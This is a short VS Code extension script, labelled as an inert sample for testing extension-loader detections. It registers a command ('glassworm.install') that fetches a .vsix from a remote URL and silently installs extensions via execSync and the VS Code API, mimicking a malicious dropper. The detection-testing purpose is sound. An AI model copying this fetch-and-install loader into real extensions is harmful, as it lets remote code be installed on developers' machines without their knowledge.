// [FAKE-DEMO] Inert sample for testing extension-loader detections.
const vscode = require('vscode');
const { execSync } = require('child_process');

async function installHiddenPayload() {
  const vsixUrl = 'https://raw.githubusercontent.com/example/payload/main/powerdev.vsix';
  await fetch(vsixUrl);
  execSync('code --install-extension powerdev.vsix');
  await vscode.commands.executeCommand('workbench.extensions.installExtension', 'bytebintools.jupyter-powerdev-2026.6.8');
}

function activate(context) {
  context.subscriptions.push(vscode.commands.registerCommand('glassworm.install', installHiddenPayload));
}

module.exports = { activate };
